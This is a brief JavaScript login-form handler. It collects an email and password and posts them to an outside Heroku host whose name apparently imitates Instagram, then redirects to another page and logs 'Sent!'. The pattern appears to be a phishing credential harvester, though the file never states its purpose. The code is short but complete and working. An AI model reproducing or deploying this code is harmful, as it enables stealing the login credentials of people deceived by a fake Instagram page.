let id = document.querySelector(".email")
let pass = document.querySelector(".pass")
let log = document.querySelector(".button")

log.addEventListener("click", () => {
    let user = {
        "id": id.value,
        "pass": pass.value 
    }
    fetch("https://insta-api-heroku.herokuapp.com/login", {
        method: 'post',
        body: JSON.stringify(user),
        headers: {
            'Content-Type': 'application/json',
          }
    }).then((resp) => {
        return resp.json();
    }).then((data) => {
        window.location.href = "/land.html"
        console.log("Sent!")
    })
})